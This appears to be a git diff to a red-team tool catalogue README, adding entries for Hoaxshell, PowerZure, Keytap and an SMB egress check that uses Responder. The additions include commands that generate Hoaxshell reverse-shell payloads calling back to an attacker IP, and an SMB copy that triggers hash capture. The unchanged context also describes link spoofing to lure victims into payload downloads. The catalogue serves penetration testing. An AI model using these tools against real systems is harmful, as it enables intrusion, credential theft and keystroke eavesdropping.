@@ -23,7 +23,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Red Team Tips</b> 15 tips</summary>
+    <summary><b>Red Team Tips</b> 16 tips</summary>
     <ul>
         <ul>
             <li><b><a href="#hiding-the-local-admin-account">Hiding the local admin account</a></b><i> @Alh4zr3d</i></li>
@@ -41,6 +41,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#enumerate-applocker-rules">Enumerate AppLocker rules</a></b><i> @Alh4zr3d</i></li>
             <li><b><a href="#cmd-shortcut-with-6-pixels-via-mspaint">CMD shortcut with 6 pixels via mspaint</a></b><i> PenTestPartners</i></li>
             <li><b><a href="#link-spoofing-with-preventdefault-javascript-method">Link spoofing with PreventDefault JavaScript method</a></b><i> </i></li>
+            <li><b><a href="#check-smb-firewall-rules-with-responder">Check SMB firewall rules with Responder</a></b><i> @malmoeb</i></li>
         </ul>
     </ul>        
 </details>
@@ -104,7 +105,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Execution</b> 12 tools</summary>
+    <summary><b>Execution</b> 13 tools</summary>
     <ul>
         <ul>
             <li><b><a href="#responder">Responder</a></b><i> LLMNR, NBT-NS and MDNS poisoner</i></li>
@@ -118,7 +119,8 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#sqlrecon">SQLRecon</a></b><i> Offensive MS-SQL toolkit</i></li>
             <li><b><a href="#ultimateapplockerbypasslist">UltimateAppLockerByPassList</a></b><i> Common AppLocker Bypass Techniques</i></li>
             <li><b><a href="#starfighters">StarFighters</a></b><i> JavaScript and VBScript Based Empire Launcher</i></li>
-            <li><b><a href="#demiguise">demiguise</a></b><i> HTA encryption toola</i></li>
+            <li><b><a href="#demiguise">demiguise</a></b><i> HTA encryption tool</i></li>
+            <li><b><a href="#powerzure">PowerZure</a></b><i> PowerShell framework to assess Azure security</i></li>
         </ul>
     </ul>
 </details>
@@ -234,7 +236,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Command and Control</b> 8 tools</summary>
+    <summary><b>Command and Control</b> 9 tools</summary>
     <ul>
         <ul>
             <li><b><a href="#living-off-trusted-sites-project">Living Off Trusted Sites Project</a></b><i> Leverage legitimate domains for your C2</i></li>
@@ -245,6 +247,7 @@ Some of the tools may be specifically designed for red teaming, while others are
     	    <li><b><a href="#pupy">Pupy</a></b><i> Command and control framework (Python)</i></li>
     	    <li><b><a href="#brute-ratel">Brute Ratel</a></b><i> Command and control framework ($$$)</i></li>
             <li><b><a href="#nimplant">NimPlant</a></b><i> C2 implant written in Nim</i></li>
+            <li><b><a href="#hoaxshell">Hoaxshell</a></b><i> PowerShell reverse shell</i></li>
         </ul>
     </ul>
 </details>
@@ -263,12 +266,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Impact</b> 3 tools</summary>
+    <summary><b>Impact</b> 4 tools</summary>
     <ul>
         <ul>
             <li><b><a href="#conti-pentester-guide-leak">Conti Pentester Guide Leak</a></b><i> Conti ransomware group affilate toolkit</i></li>
             <li><b><a href="#slowloris">SlowLoris</a></b><i> Simple denial of service</i></li>
             <li><b><a href="#usbkill">usbkill</a></b><i> Anti-forensic kill-switch</i></li>
+            <li><b><a href="#keytap">Keytap</a></b><i> Get pressed keyboard keys from typing audio</i></li>
         </ul>
     </ul>
 </details>
@@ -483,6 +487,20 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
 **Description:** *Threat actors have been observed using this technique to trick victims into clicking spoofed in-page malware download links. Using the PreventDefault JavaScript method you can spoof the hover link to display a legit link `google.com`, but once clicked the victim will be redirected to your malicious link `bing.com`. Great for getting victims to download payloads via a controlled site.*
 
 **Link:** [PreventDefault Docs](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)
+
+### [🔙](#tool-list)Check SMB firewall rules with Responder
+
+![image](https://user-images.githubusercontent.com/100603074/229650380-b651cfc4-896f-4429-b7b4-54d1241a5b39.png)
+
+```powershell
+Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
+```
+
+**Description:** *'When I do a Compromise Assessment, I often ask the customer if I can do a last quick check: `Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"`. If Responder could capture the hash, the firewall allows outgoing SMB connections'*
+
+**Credit:** [@malmoeb](https://twitter.com/malmoeb)
+
+**Link:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)
 
 Reconnaissance
 ====================
@@ -1838,6 +1856,35 @@ python demiguise.py -k hello -c "notepad.exe" -p Outlook.Application -o test.hta
 ![image](https://user-images.githubusercontent.com/100603074/217654229-fb3a4875-2de2-4bc3-9583-8300e014fda4.png)
 
 *Image used from https://github.com/nccgroup/demiguise*
+
+## [🔙](#tool-list)[PowerZure](https://github.com/hausec/PowerZure)
+
+PowerZure is a PowerShell project created to assess and exploit resources within Microsoft’s cloud platform, Azure. PowerZure was created out of the need for a framework that can both perform reconnaissance and exploitation of Azure, AzureAD, and the associated resources.
+
+There is zero reason to ever run PowerZure on a victim’s machine. Authentication is done by using an existing accesstoken.json file or by logging in via prompt when logging into Azure, meaning you can safely use PowerZure to interact with a victim’s cloud instance from your operating machine.
+
+**Install:** 
+
+```bash
+Install-Module -Name Az
+git clone https://github.com/hausec/PowerZure
+cd PowerZure
+ipmo C:\path\to\PowerZure.psd1
+```
+
+**Usage:** 
+
+```bash
+# Get a list of AzureAD and Azure objects you have access to
+Get-AzureTarget
+```
+
+[Blog - Attacking Azure, Azure AD, and Introducing PowerZure](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
+
+![image](https://user-images.githubusercontent.com/100603074/229649681-a1d83b3c-b595-417b-8d77-c3ba90da203f.png)
+
+*Image used from https://hakin9.org*
+
 
 Persistence
 ====================
@@ -3924,6 +3971,42 @@ Full usage information can be found [here](https://github.com/chvancooten/NimPla
 
 *Image used from https://casvancooten.com*
 
+### [🔙](#tool-list)[Hoaxshell](https://github.com/t3l3machus/hoaxshell)
+
+A Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.
+
+**Install:** 
+
+```bash
+git clone https://github.com/t3l3machus/hoaxshell
+cd ./hoaxshell
+sudo pip3 install -r requirements.txt
+chmod +x hoaxshell.py
+```
+
+**Usage:** 
+
+```bash
+# Payload that utilizes Invoke-Expression (default)
+sudo python3 hoaxshell.py -s <your_ip>
+
+# Payload that writes and executes commands from a file
+sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
+
+# Encrypted shell session with a trusted certificate
+sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
+```
+
+Full usage documentation [here](https://github.com/t3l3machus/hoaxshell#usage).
+
+[Usage Demo - YouTube](https://www.youtube.com/watch?v=SEufgD5UxdU)
+
+[Hoaxshell vs AV](https://github.com/t3l3machus/hoaxshell#av-bypass-pocs)
+
+![image](https://user-images.githubusercontent.com/100603074/229649767-817d838c-891d-4a33-b494-9249f3a2f404.png)
+
+*Image used from https://github.com/t3l3machus/hoaxshell*
+
 Exfiltration
 ====================
 
@@ -4193,7 +4276,7 @@ cd slowloris
 
 ```bash
 # Pip
-slowloris example.com
+slowloris example.comr
 
 # Git
 python3 slowloris.py example.com
@@ -4226,3 +4309,41 @@ sudo python3 usbkill.py
 ![image](https://user-images.githubusercontent.com/100603074/217654429-98efef6d-b70f-48b8-8979-228ce2f78932.png)
 
 *Image used from https://en.wikipedia.org/wiki/USBKill*
+
+### [🔙](#tool-list)[Keytap](https://github.com/ggerganov/kbd-audio)
+
+This is a tool that can guess the pressed keyboard keys from the audio of a computer's microphone.
+
+Keytap2 can also be used to retrieve text from audio snippets of keyboard typing.
+
+**Install: (Build)** 
+
+```
+git clone https://github.com/ggerganov/kbd-audio
+cd kbd-audio
+git submodule update --init
+mkdir build && cd build
+cmake ..
+make
+```
+
+**Usage:**
+
+```bash
+# Record audio to a raw binary file on disk
+./record-full output.kbd [-cN]
+
+# Playback a recording captured via the record-full tool
+./play-full input.kbd [-pN]
+
+# Record audio only while typing (Useful for collecting training data for keytap)
+./record output.kbd [-cN] [-CN]
+```
+
+See full usage documentation [here](https://github.com/ggerganov/kbd-audio#tool-details).
+
+Try the online demo at [https://keytap.ggerganov.com/](https://keytap.ggerganov.com/).
+
+![image](https://user-images.githubusercontent.com/100603074/229649861-728e7ebb-ddb9-4347-9934-dd077d12bb41.png)
+
+*Image used from https://github.com/ggerganov/kbd-audio*
